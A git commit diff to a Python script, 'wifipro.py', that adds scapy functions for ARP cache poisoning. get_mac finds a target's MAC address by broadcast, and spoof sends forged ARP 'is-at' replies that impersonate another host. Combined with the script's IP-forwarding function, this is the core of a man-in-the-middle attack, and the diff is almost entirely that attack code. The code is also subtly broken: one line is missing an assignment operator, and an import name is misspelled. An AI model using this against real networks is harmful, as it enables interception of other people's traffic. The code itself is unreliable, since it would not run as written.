46abf7f0361d7e61284ab0f653ec7630bca0e41e
calee14 <caplee1000@gmail.com>
2019-11-03 18:09:25 -0800

    crafting the spoof attack

--- wifipro.py
+++ wifipro.py
@@ -1,4 +1,4 @@
-from scapy.all import *
+from scapy.all import Ether, ARP, srp, send
 import argsparse
 import time
 import os
@@ -26,6 +26,34 @@ def enable_ip_route(verbose=True):
 	_enable_linux_iproute()
 	if verbose:
 		print("[!] IP Routing enabled.")
+
+def get_mac(ip):
+	"""
+	Returns MAC address of any device connected to the network
+	If ip is down, returns None instead
+	"""
+	ans, _ srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+	if ans:
+		return ans[0][1].src
+
+def spoof(target_ip, host_ip, verbose=True):
+	"""
+	Spoofs 'target_ip' saying that we are 'host_ip'
+	it is accomplished by changing the ARP cache of the target (poisoning)
+	"""
+	# get the mac address of the target
+	target_mac = get_mac(target_ip)
+	# craft the arp 'is-at' operation packet, in other words; an ARP response
+	# we don't specifiy 'hwsrc' (source MAC address)
+	# because by default, 'hwsrc' is the real MAC address of the sender (ours)
+	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+	# send the packet
+	# verbose = 0 means that we send the packet without printing anything
+	send(arp_response, verbose=0)
+	if verbose:
+		# get the MAC address of the default interface we are using
+		self_mac = ARP().hwsrc
+		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 def get_mac_address():
 	import uuid
 	# after each 2 digits, join elements of getnode().
